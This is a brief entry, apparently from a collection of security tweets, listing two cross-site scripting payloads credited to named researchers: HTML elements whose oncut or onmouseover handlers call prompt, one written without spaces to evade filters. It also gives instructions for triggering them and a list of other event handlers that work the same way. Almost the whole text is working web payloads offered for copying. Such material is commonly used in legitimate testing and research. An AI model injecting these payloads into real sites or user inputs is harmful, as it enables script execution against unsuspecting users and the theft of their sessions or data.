name: XSS Payloads
tweet:
Copy/paste vector by @s0md3v
<x oncut=y=prompt,y``>z 

And without space by @0w4ys
<o/onmouseover=o=prompt,o``>o

Press Ctrl+X or cut "z" with right click to execute.
Works with: oncut, oncopy, onpaste, onclick, onmousedown, onmouseup, onmouseover, onmouseout, ondrag.
